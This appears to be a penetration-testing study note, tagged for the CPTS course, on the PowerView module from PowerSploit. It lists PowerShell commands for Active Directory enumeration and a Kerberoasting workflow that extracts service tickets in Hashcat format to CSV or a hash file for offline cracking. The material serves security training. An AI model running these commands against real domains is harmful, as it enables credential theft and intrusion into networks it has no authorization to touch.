---
tags: [cpts, tool, powerview, powersploit, ad-enum]
---

# 🧰 PowerView

## 📦 Install
Part of PowerSploit. See [[Tool-Install]].

## 🎯 Purpose
PowerShell AD enumeration framework — domain policy, users/SPNs, Kerberoast ticket extraction, and more.

## 🧱 Core syntax
```powershell
Import-Module .\PowerView.ps1
```

## 🚩 Useful commands (from these notes)
```powershell
Get-DomainPolicy                                                 # password/lockout/Kerberos policy
Get-DomainUser * -spn | select samaccountname                    # list SPN accounts
Get-DomainUser -Identity $USER | Get-DomainSPNTicket -Format Hashcat
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\tgs.csv -NoTypeInformation
Get-DomainUser $USER -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
```

## 🔧 Variants
```powershell
# Full Kerberoast-to-file in one line
Get-DomainUser -Identity $USER | Get-DomainSPNTicket -Format Hashcat | Select-Object -ExpandProperty Hash | Out-File -Encoding ascii .\hash.txt
```

#powerview #cpts
